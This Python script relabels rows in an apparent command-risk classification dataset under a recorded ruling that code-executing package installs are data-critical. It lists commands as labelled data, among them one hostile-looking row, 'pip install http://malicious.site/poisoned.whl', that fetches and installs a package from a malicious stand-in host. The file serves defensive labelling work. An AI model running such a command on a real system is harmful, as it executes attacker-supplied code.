#!/usr/bin/env python3
"""Apply rule 16 (package-manager code-execution capability), ruled 2026-08-15.

Amy, in full, ruled AGAINST a 5/5 unanimous blind-family council -- the only
time in this corpus that has happened:

  "the attitude that package managers are harmless and are not at *least*
  situation normal is dangerous and causes a lot of harm. Updating
  dependencies is bringing in code we know little about, sometimes with
  reputation if we're lucky. So over time, my tools, at least, will tend
  towards ranking package management as a significant mutation with risks
  to quality and security. There are supply chain risks these days.
  There's plain old bugs and changes in behavior. We ignored it before bc
  humans had limited attention but now we have you. So we will do our part
  to nudge more thought on package management operations. I disagree with
  the blind families, unless we know a package is just files and does not
  do code exec. like 'tar -xzvf' is a situation normal bc it creates some
  files but won't exec. could maybe overwrite so it's SN and not
  informational, but probably it's fine all other things considered."

The operative distinction is CODE-EXECUTION CAPABILITY, not "is this a
package manager":

  - install/upgrade with a lifecycle-script or build-script exec path
    (npm postinstall, pip setup.py/build backend, cargo build.rs, gem
    extconf.rb, deb postinst, rpm %post, pacman install hooks, snap hooks,
    composer scripts, NuGet install.ps1, ...) -> data-critical, FULL STOP,
    independent of registry trust. This does NOT inherit rule 15's
    trusted-host exception -- a compromised trusted registry is exactly the
    supply-chain risk named above.
  - pure file materialization with NO execution path (her example:
    `tar -xzvf`) -> situation-normal (it creates/can overwrite files, so
    not `informative`; nothing executes, so not `data-critical`).

This OVERTURNS the 5/5 unanimous blind relabel recorded in d8d2e75 on the
original slice4/fetchexec.jsonl rows. Recorded as a ruling, not a data
point: the family consensus does not get the last word here, same as it
never has for rules 11-15 -- every one of them came from Amy's explicit
ruling on a quoted question, not from relabel agreement.

Genuinely NOT addressed by this ruling, and not decided here either:
lockfile-pinned installs (`npm ci`, `pip install -r reqs.txt
--require-hashes`) still execute lifecycle scripts by default -- pinning
constrains WHICH code runs, not WHETHER it runs, so by the letter of the
ruling (exec capability, not trust) these stay data-critical, but they are
marked contested here specifically because the pinning question itself is
open and Amy did not rule on it.

A few rows required a judgment call this script does NOT attribute to Amy:
`cargo add` (manifest edit + registry resolve, no build -- build.rs runs at
`cargo build`, not `cargo add`) and `cargo add --dry-run` stay
situation-normal/informative under the download-vs-execute distinction
already settled by slice 4's held download-then-run split (read-only-after
= situation-normal, run-after = data-critical -- cited, not re-derived).
`mix deps.get` and `flutter pub get` are marked CONTESTED rather than
confidently reclassified: their build-hook semantics were not verified here
the way npm/pip/gem/cargo/apt/dnf/pacman/brew/conda/apk/snap/composer/nuget
were.

    python3 apply_rule16.py [--apply]

Dry-run by default. Idempotent (a MARK check skips already-applied rows).
Rows are enumerated by exact text match, not regex, per apply_rule15.py's
own reasoning: a regex over command text would be a second thing to get
wrong, and there are a bounded, countable number of rows here too.

Committed with the numbers it produces, per commit-the-scorer.
"""
import argparse
import json
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
V9 = HERE.parent

QUOTE = ('Amy, 2026-08-15: "the attitude that package managers are harmless and are not '
         'at least situation normal is dangerous... I disagree with the blind families, '
         'unless we know a package is just files and does not do code exec."')
EXEC = f'Rule 16: install/upgrade with lifecycle-script exec capability -> data-critical. {QUOTE}'
NOEXEC = (f'Rule 16: no execution path present (manifest edit / fetch-only / scripts '
          f'explicitly disabled) -> situation-normal, her tar -xzvf case. {QUOTE}')
LOCKFILE_OPEN = (EXEC + ' Marked contested: lockfile/hash pinning constrains WHICH code '
                  'runs, not WHETHER it runs, so this stays data-critical by the letter of '
                  'the ruling -- but Amy did not address pinning specifically, and this is '
                  'the natural row for her to revisit if she wants to draw that line.')
UNCERTAIN_HOOKS = ('Rule 16 applies IF this has an exec path; not confidently verified here '
                    'whether this ecosystem runs build/lifecycle scripts at this step. '
                    'Marked contested rather than guessed -- see apply_rule16.py docstring.')
MARK = '  [RULE 16]'

# (slice, stem, exact text, new_label, new_contested, reason)
DECISIONS = [
    # --- slice4/fetchexec.jsonl: the 10 rows the 5/5 council held against.
    # Reinstate the ORIGINAL generator proposal; rule 16 agrees with it.
    ('slice4', 'fetchexec', 'npm install some-package', 'data-critical', False, EXEC),
    ('slice4', 'fetchexec', 'pip install requests', 'data-critical', False, EXEC),
    ('slice4', 'fetchexec', 'cargo install ripgrep', 'data-critical', False, EXEC),
    ('slice4', 'fetchexec', 'npm install -g cli-tool', 'data-critical', False, EXEC),
    ('slice4', 'fetchexec', 'gem install bundler', 'data-critical', False, EXEC),
    ('slice4', 'fetchexec', 'go install example.com/tool@latest', 'data-critical', False, EXEC),
    ('slice4', 'fetchexec', 'pip install https://example.com/pkg.tar.gz', 'data-critical', False, EXEC),
    ('slice4', 'fetchexec', 'pip install git+https://github.com/user/repo.git', 'data-critical', False, EXEC),
    ('slice4', 'fetchexec', 'pip install http://malicious.site/poisoned.whl', 'data-critical', False, EXEC),
    ('slice4', 'fetchexec', 'pip install -e git+https://example.com/project.git#egg=proj', 'data-critical', False, EXEC),

    # --- slice6: apt install/reinstall rows, previously situation-normal
    ('slice6', 'sysverbs', 'apt-get update && apt-get install nginx', 'data-critical', False, EXEC),
    ('slice6', 'syspaths', 'chmod 644 /etc/hosts; apt install --reinstall openssh-server', 'data-critical', False, EXEC),
    ('slice6', 'syspaths', 'apt install --reinstall coreutils', 'data-critical', False, EXEC),

    # --- slice8/pkgmgr.jsonl: plain package-manager installs, exec capability present
    ('slice8', 'pkgmgr', 'apt install nginx', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'dnf install httpd', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'pacman -S vim', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'brew install wget', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'conda install numpy', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'apk add curl', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'snap install code', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'composer require monolog/monolog', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'poetry add requests', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'uv add httpx', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'npm install express', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'npm install lodash', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'pip install --no-deps -r requirements.txt', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'pip install -r requirements.txt', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'sudo apt install nginx', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'pip install --user requests', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'gem install rails', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'go install golang.org/x/tools/gopls@latest', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'cd project && npm install && npm run build', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'python -m venv .venv && source .venv/bin/activate && pip install -r requirements.txt', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'git clone https://github.com/example/repo.git && cd repo && cargo build', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'bundle install', 'data-critical', False, EXEC),
    ('slice8', 'pkgmgr', 'nuget install Newtonsoft.Json', 'data-critical', False, EXEC),

    # --- slice8: lockfile-pinned forms -- exec capability present, but the
    # pinning question itself is unruled. Data-critical per the letter of
    # the ruling, contested to flag the open refinement.
    ('slice8', 'pkgmgr', 'npm ci', 'data-critical', True, LOCKFILE_OPEN),

    # --- slice8: no execution path present -- her tar -xzvf case, applied
    ('slice8', 'pkgmgr', 'npm install --ignore-scripts', 'situation-normal', False, NOEXEC),
    ('slice8', 'pkgmgr', 'cargo add serde', 'situation-normal', False,
     NOEXEC + ' cargo add edits Cargo.toml and resolves versions; build.rs runs at '
     '`cargo build`, not here -- same download-vs-execute split already settled by '
     "slice 4's held download-then-run pair."),

    # --- slice8: genuinely uncertain build-hook semantics, not guessed
    ('slice8', 'pkgmgr', 'mix deps.get', 'situation-normal', True, UNCERTAIN_HOOKS),
    ('slice8', 'pkgmgr', 'flutter pub get', 'situation-normal', True, UNCERTAIN_HOOKS),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--apply', action='store_true')
    args = ap.parse_args()

    files = {}
    for sl, stem, *_ in DECISIONS:
        key = (sl, stem)
        if key not in files:
            p = V9 / sl / 'incoming' / f'{stem}.jsonl'
            files[key] = (p, [json.loads(l) for l in p.read_text().splitlines() if l.strip()])

    flips = resolved = already = notfound = 0
    for sl, stem, text, final, contested, why in DECISIONS:
        _, rows = files[(sl, stem)]
        matches = [r for r in rows if r['text'] == text]
        if not matches:
            print(f'  NOT FOUND: {sl}/{stem}: {text!r}')
            notfound += 1
            continue
        r = matches[0]
        if MARK in r['note']:
            already += 1
            continue
        was_label, was_contested = r['label'], r['contested']
        base_note = r['note'].split('  [CONTESTED]')[0].split('  [council')[0].rstrip()
        r['note'] = f'{base_note}{MARK} {why}'
        r['label'] = final
        r['contested'] = contested
        if was_label != final:
            flips += 1
        if was_contested and not contested:
            resolved += 1
        chg = f'{was_label} -> {final}' if was_label != final else f'{final} (held)'
        tag = ' [contested]' if contested else (', un-contested' if was_contested else '')
        print(f'  {sl}/{stem}  {chg}{tag}')
        print(f'      {r["text"][:74]}')

    print(f'\n{flips} label flips, {resolved} contested resolved, '
          f'{already} already applied, {notfound} not found')
    if notfound:
        raise SystemExit('refusing to report success with unmatched rows')
    if args.apply:
        for p, rows in files.values():
            p.write_text('\n'.join(json.dumps(x, sort_keys=True) for x in rows) + '\n')
        print('applied')
    else:
        print('(dry run -- pass --apply to write)')
    return 0


if __name__ == '__main__':
    sys.exit(main())
